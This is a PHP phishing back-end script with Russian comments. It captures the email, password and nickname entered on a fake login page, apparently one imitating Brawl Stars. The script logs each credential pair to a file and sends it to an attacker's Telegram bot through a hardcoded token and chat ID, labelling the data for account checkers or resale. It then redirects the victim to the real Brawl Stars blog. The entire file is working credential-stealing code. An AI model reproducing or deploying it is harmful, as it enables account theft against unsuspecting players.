<?php
/**
 * Created by Magic_Team.
 * User: Magic
 * Date: 18.03.2021
 * Time: 22:45
 */


// сюда нужно вписать токен вашего бота
define('TELEGRAM_TOKEN', '1764768505:AAEG2KugFjZeJbaliPFhimEmPsMJzF054p0');

// сюда нужно вписать ваш внутренний айдишник
define('TELEGRAM_CHATID', '920517216');
$Log = $_POST['email'];
$Pass = $_POST['password'];
$Name = $_POST['name'];

$message = '
👑 Данные от аккаунта: '.PHP_EOL.'
✅ Логин: '.$Log.PHP_EOL.'
✅ Пароль: '.$Pass.PHP_EOL.'
✅ Ник: '.$Name.PHP_EOL.'
✅ Для чекера/продажи: '.$Log.':'.$Pass.PHP_EOL.'
';

$log = fopen("baza.txt","at");
fwrite($log,"$Log:$Pass\n");
fclose($log);

message_to_telegram($message);

// Телеграм Отчет (Отсылает сообщения в телеграмм).
function message_to_telegram($text) {
    $ch = curl_init();
    curl_setopt_array(
        $ch,
        array(
            CURLOPT_URL => 'https://api.telegram.org/bot' . TELEGRAM_TOKEN . '/sendMessage',
            CURLOPT_POST => TRUE,
            CURLOPT_RETURNTRANSFER => TRUE,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_POSTFIELDS => array(
                'chat_id' => TELEGRAM_CHATID,
                'text' => $text,
            ),
        )
    );
    curl_exec($ch);
}

echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=https://blog.brawlstars.com'></head></html>";
